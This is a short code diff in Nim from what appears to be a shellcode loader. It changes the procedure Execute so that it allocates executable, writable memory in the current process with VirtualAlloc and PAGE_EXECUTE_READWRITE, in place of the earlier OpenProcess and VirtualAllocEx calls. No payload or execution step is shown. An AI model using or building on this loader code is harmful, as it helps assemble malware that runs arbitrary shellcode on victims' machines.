@@ -8,12 +8,8 @@ proc Execute(shellcode: openarray[byte]):void =
 
     var size  = cast[SIZE_T](len(shellcode))
     
-    let tProcess = GetCurrentProcessId()
-    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
-
-    let rPtr = VirtualAllocEx(
-        pHandle,
-        NULL,
+    let rPtr = VirtualAlloc(
+        nil,
         size,
         MEM_COMMIT,
         PAGE_EXECUTE_READWRITE
